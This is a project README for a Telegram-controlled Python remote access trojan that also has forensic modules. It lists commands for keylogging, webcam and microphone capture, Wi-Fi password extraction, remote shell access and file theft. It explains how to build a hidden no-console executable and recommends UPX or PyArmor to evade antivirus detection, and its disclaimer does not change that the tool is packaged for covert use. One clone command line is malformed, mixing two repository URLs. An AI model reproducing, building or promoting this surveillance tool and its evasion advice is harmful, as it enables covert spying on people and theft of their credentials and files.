# 📡 AEGIS-X – Ultimate Telegram RAT with Forensic Modules

**AEGIS-X** is a **feature‑rich Remote Administration Tool (RAT)** written in Python, controlled via the **Telegram Bot API**. It combines traditional RAT capabilities (screen capture, keylogging, file transfer, shell access) with **advanced cyber‑forensic modules** for incident response and threat hunting.

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://www.python.org/)
[![Telegram](https://img.shields.io/badge/Telegram-Bot-blue.svg)](https://core.telegram.org/bots)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

---

## ⚠️ Legal Disclaimer

> **This tool is intended for authorised security testing, educational research, and system administration only.**  
> Unauthorised use on systems you do not own is **illegal** and **unethical**. The author is not responsible for any misuse.  
> **Use responsibly and only where you have explicit permission.**

---

## 🚀 Features

### 🖥️ RAT (Remote Administration)

| Category | Commands |
|----------|----------|
| **System** | `/cmd`, `/shell`, `/sysinfo`, `/shutdown`, `/restart` |
| **File Operations** | `/ls`, `/getfile`, `/delete`, `/search` |
| **Media Capture** | `/screenshot`, `/screenrec`, `/webcam`, `/rec` |
| **Surveillance** | `/keylog`, `/clipboard`, `/wifi` |
| **Archiving** | `/images`, `/videos`, `/pdf` (with ZIP support) |

### 🔍 Forensic Modules (AEGIS-X Core)

| Module | Description |
|--------|-------------|
| **Process Audit** | List active processes with digital signature verification |
| **Network Sniffer** | Show live connections with Geo‑IP mapping (country, city, ISP) |
| **Persistence Hunt** | Scan Registry RunKeys, Startup folders, WMI subscriptions, Browser extensions |
| **File System Forensics** | Recent files (last 3 days), Windows Prefetch, USB device history, Alternate Data Streams (ADS) |
| **Event Log Analysis** | Security (4688), PowerShell (4104), and System logs |
| **FBI Tactical Audit** | 10‑step automated PowerShell investigation |
| **Live Response Triage** | 25‑step critical incident protocol |
| **Evidence Export** | Export all findings to a timestamped text file |

---

## 📁 Project Structure

```
AEGIS-X/
├── bot.py              # Main Telegram RAT + Forensic integration
├── utils.py            # Helper functions (timestamp, hashing, process termination)
├── scanner.py          # Process, services, tasks, drivers, persistence
├── network.py          # Network connections, Geo‑IP, DNS, ARP, routing
├── forensics.py        # File system, event logs, tactical audit, triage, export
├── database/           # (Optional) GeoIP database folder
│   ├── GeoLite2-City.mmdb
│   └── GeoLite2-ASN.mmdb
├── requirements.txt    # Python dependencies
└── README.md           # This file
```

---

## 🔧 Installation & Setup

### 1️⃣ Clone the Repository
```bash
git clone https://github.com/yourusername/AEGIS-X.git](https://github.com/Jayasankha-dev/CodeRED-Tool.git
cd AEGIS-X
```

### 2️⃣ Install Dependencies
```bash
pip install -r requirements.txt
```

**requirements.txt:**
```
pyTelegramBotAPI
Pillow
opencv-python
psutil
sounddevice
scipy
pynput
pyperclip
mss
numpy
tabulate
geoip2
```

### 3️⃣ Configure the Bot

Open `bot.py` and replace the following placeholders:

```python
TOKEN = "YOUR_BOT_TOKEN_HERE"           # Get from @BotFather on Telegram
ADMIN_CHAT_ID = "YOUR_CHAT_ID_HERE"     # Your numeric Telegram user ID
```

**How to get your Chat ID:**  
Send `/start` to [@userinfobot](https://t.me/userinfobot) – it will reply with your numeric ID.

### 4️⃣ (Optional) Geo‑IP Databases

For network connection geolocation, download the free GeoLite2 databases:

- [GeoLite2-City.mmdb](https://dev.maxmind.com/geoip/geolite2-free-geolocation-data)
- [GeoLite2-ASN.mmdb](https://dev.maxmind.com/geoip/geolite2-free-geolocation-data)

Place them in the `database/` folder.

---

## 🚀 Build a Standalone EXE (Windows)

To convert the script into a **single, hidden executable** that runs without Python installed:

```bash
python -m PyInstaller --onefile --noconsole bot.py --add-data "database;database"
```

**Output:** `dist/bot.exe` – Copy this to any Windows machine and double‑click.

> **Tip:** If you get a `PermissionError`, ensure no previous `bot.exe` is running (kill it in Task Manager) or build with a different name:  
> `--name mybot`

---

## 📋 Command Reference

### 🔹 RAT Commands

| Command | Description | Example |
|---------|-------------|---------|
| `/start` | Show the full help menu | `/start` |
| `/cmd <command>` | Execute a Windows command | `/cmd ipconfig` |
| `/shell on/off` | Toggle interactive shell mode | `/shell on` |
| `/ls <path>` | List directory contents | `/ls C:\Users` |
| `/screenshot` | Capture screen (PNG) | `/screenshot` |
| `/screenrec` | Record screen (3s MP4) | `/screenrec` |
| `/webcam` | Capture webcam photo (JPG) | `/webcam` |
| `/sysinfo` | Show CPU, RAM, battery status | `/sysinfo` |
| `/keylog on/off/get` | Keyboard logger control | `/keylog on` |
| `/rec <sec>` | Record microphone (max 30s) | `/rec 5` |
| `/wifi` | Extract saved Wi‑Fi passwords | `/wifi` |
| `/search <name>` | Search files on C: drive | `/search secret.txt` |
| `/clipboard` | Get clipboard text | `/clipboard` |
| `/shutdown` | Shut down the system (5s delay) | `/shutdown` |
| `/restart` | Restart the system (5s delay) | `/restart` |
| `/getfile <path>` | Download a file | `/getfile C:\file.txt` |
| `/delete <path>` | Delete a file or folder | `/delete C:\temp` |
| `/images [zip] <path>` | List or ZIP images | `/images zip C:\Pics` |
| `/videos [zip] <path>` | List or ZIP videos | `/videos C:\Videos` |
| `/pdf [zip] <path>` | List or ZIP PDFs | `/pdf zip C:\Docs` |

### 🔹 Forensic Commands

| Command | Description |
|---------|-------------|
| `/forensic` | Show forensic menu |
| `/processes` | Active processes with signature status |
| `/network` | Network connections + Geo‑IP mapping |
| `/persistence` | Registry RunKeys, Startup, WMI, Browser extensions |
| `/files` | Recent files, Prefetch, USB history, ADS |
| `/eventlogs` | Security (4688), PowerShell (4104), System logs |
| `/tactical` | 10‑step FBI tactical audit |
| `/triage` | 25‑step live response triage |
| `/export` | Export all evidence to a timestamped file |

> **Note:** Long outputs (more than 4000 characters) are automatically sent as **text files** via Telegram.

---

## 🧠 How It Works

1. **Bot Startup:**  
   - Waits for an active internet connection.
   - Installs missing dependencies silently.
   - Starts a background keylogger thread (inactive by default).
   - Polls Telegram for new commands.

2. **Command Execution:**  
   - Commands are dispatched to dedicated handlers.
   - System commands run via `subprocess` with hidden windows.
   - Media files (screenshots, videos, audio) are saved temporarily, sent, then deleted.

3. **Forensic Modules:**  
   - Use `psutil`, `winreg`, PowerShell, and custom parsing.
   - Geo‑IP mapping uses MaxMind databases (optional).
   - Evidence can be exported as a single text file for reporting.

4. **Stealth:**  
   - All subprocesses are hidden (`CREATE_NO_WINDOW` / `STARTUPINFO`).
   - Built with `--noconsole` – no terminal window appears.

---

## 🔒 Security & Privacy

| Aspect | Details |
|--------|---------|
| **Token Storage** | Hardcoded in `bot.py`. *Recommend:* Use environment variables or XOR obfuscation. |
| **Keylogger** | Only active when `/keylog on` is sent. Buffer cleared after `/keylog get`. |
| **File Access** | Has read/write/delete permissions of the current user. |
| **Network Traffic** | All communications go through Telegram (TLS‑encrypted). |
| **Antivirus** | Python RATs may be flagged. Use UPX compression or PyArmor to reduce detection. |

---

## 🛠️ Troubleshooting

| Issue | Solution |
|-------|----------|
| `ModuleNotFoundError` | Run the script once – it auto‑installs missing packages. |
| `PermissionError` during build | Kill any running `bot.exe` in Task Manager, or use `--name` to build with a different filename. |
| Bot doesn't respond | Check that `TOKEN` and `ADMIN_CHAT_ID` are correct. Ensure the machine has internet access. |
| Keylogger not working | Run as **Administrator** (global keyboard hooks require admin rights on Windows). |
| `/webcam` fails | Check that a webcam is connected and drivers are installed. |

---

## 📦 Dependencies (Auto‑Installed)

| Library | Purpose |
|---------|---------|
| `pyTelegramBotAPI` | Telegram Bot API wrapper |
| `Pillow` | Screenshot capture |
| `opencv-python` | Webcam & video processing |
| `psutil` | System info, processes, network |
| `sounddevice` + `scipy` | Microphone recording |
| `pynput` | Keylogger |
| `pyperclip` | Clipboard access |
| `mss` + `numpy` | Screen recording |
| `tabulate` | Table formatting for logs |
| `geoip2` | Geo‑IP lookup |

---

## 👨‍💻 Contributing

Pull requests and suggestions are welcome!  
For major changes, please open an issue first to discuss.

**To contribute:**
1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/amazing-feature`).
3. Commit your changes (`git commit -m 'Add some amazing feature'`).
4. Push to the branch (`git push origin feature/amazing-feature`).
5. Open a Pull Request.

---

## 📜 License

This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.

---

## 🌟 Acknowledgments

- [PyInstaller](https://pyinstaller.org/) – for standalone EXE builds.
- [MaxMind](https://www.maxmind.com/) – for GeoIP databases.
- [Telegram](https://telegram.org/) – for the reliable bot API.

---

## 📬 Contact

**Author:** [Jayasankha Madhusith]  
**GitHub:** [@Jayasankha-dev](https://github.com/Jayasankha-dev)  
**Project Link:** 
(https://github.com/Jayasankha-dev/AEGIS-X-Forensic-Core.git)
(https://github.com/Jayasankha-dev/TRAT-RUST-Project.git)
(https://github.com/Jayasankha-dev/Telegram-Windows-Control-Bot.git)
---

## 🏁 Final Words

**AEGIS‑X** is a powerful, all‑in‑one tool for remote system administration, incident response, and forensic investigation. It combines the flexibility of a Telegram‑controlled RAT with the depth of professional forensic modules.

Use it responsibly, stay ethical, and happy hunting! 🚀

---

> **Remember:** With great power comes great responsibility. Only use this tool on systems you own or have explicit permission to test.
